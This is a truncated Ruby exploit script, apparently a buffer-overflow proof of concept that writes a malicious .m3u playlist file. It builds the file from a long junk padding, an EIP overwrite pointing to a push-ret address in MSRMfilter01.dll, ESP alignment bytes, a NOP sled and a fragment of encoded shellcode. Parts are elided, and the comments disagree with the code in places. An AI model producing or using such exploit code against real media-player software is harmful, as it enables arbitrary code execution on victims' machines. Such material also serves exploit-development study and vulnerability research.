...
x            = "A" * 26064                        +   # misc junk
eip          = [0x01b56a10].pack('V')             +   # offset from MSRMfilter01.dll
prepend_esp  = "XXXX"                             +   # add 4 bytes so ESP points to the beginning of our shellcode | 000FFD34 58585858 XXXX
hellcode     = "\x90" * 25                        +   # add 8 NOP slide bytes
...
"\x43\x55\x35\x50\x41\x41"
  ...
  puts
  puts " push_ret.m3u file created!\n\n\n".foreground(:red).bright.blink
